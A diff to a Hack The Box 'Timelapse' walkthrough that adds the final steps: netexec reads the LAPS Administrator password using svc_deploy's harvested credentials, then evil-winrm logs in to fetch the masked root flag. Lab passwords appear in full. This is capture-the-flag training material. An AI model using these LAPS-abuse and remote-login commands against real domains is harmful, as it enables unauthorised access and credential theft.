@@ -6,7 +6,7 @@
 
 <img src="https://labs.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png" alt="Timelapse Machine Logo" width="150"/>
 
-- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Linux
+- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
 - Machine difficulty: 🟩 Easy (4.0)
 
 > **Timelapse** is an Easy Windows machine, which involves accessing a publicly accessible SMB share that contains a zip file. This zip file requires a password which can be cracked by using John. Extracting the zip file outputs a password encrypted PFX file, which can be cracked with John as well, by converting the PFX file to a hash format readable by John. From the PFX file an SSL certificate and a private key can be extracted, which is used to login to the system over WinRM. After authentication we discover a PowerShell history file containing login credentials for the `svc_deploy` user. User enumeration shows that `svc_deploy` is part of a group named `LAPS_Readers`. The `LAPS_Readers` group has the ability to manage passwords in LAPS and any user in this group can read the local passwords for machines in the domain. By abusing this trust we retrieve the password for the `Administrator` and gain a WinRM session.
@@ -20,9 +20,6 @@
 
 Linux:
 - `nmap`
-- `whatweb`
-- `ffuf`
-- `burpsuite`
 - `msfvenom`
 - `msfconsole`
 - `netexec`
@@ -256,7 +253,7 @@ Info: Establishing connection to remote endpoint
 ```
 *Evil-WinRM* PS C:\Users\legacyy\Documents> type C://Users//legacyy//Desktop//user.txt
 
-24003d642b5ce5d5603c7fd719b5392f 🚩
+24003*************************** 🚩
 ```
 
 ```
@@ -272,10 +269,6 @@ invoke-command -computername localhost -credential $c -port 5986 -usessl -
 SessionOption $so -scriptblock {whoami}
 get-aduser -filter * -properties *
 exit
-```
-
-```
-
 ```
 
 ```
@@ -324,11 +317,38 @@ Global Group memberships     *LAPS_Readers         *Domain Users
 ```
 
 ```
+┌──(nabla㉿kali)-[~]
+└─$ netexec smb timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --laps
 
+[SNIP]
+
+SMB         10.129.227.113  445    DC01             [-] DC01\administrator:f4]W2[hO4z-H$1;jw]UW+@a7 STATUS_LOGON_FAILURE
 ```
 
 ```
+┌──(nabla㉿kali)-[~]
+└─$ evil-winrm -i timelapse.htb -u Administrator -p 'f4]W2[hO4z-H$1;jw]UW+@a7' --ssl
 
+[SNIP]
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+```
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue
+
+    Directory: C:\Users\TRX\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        6/30/2025   5:58 PM             34 root.txt
+```
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type C://Users//TRX//Desktop//root.txt
+
+40b45*************************** 🚩
 ```
 
 <img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>
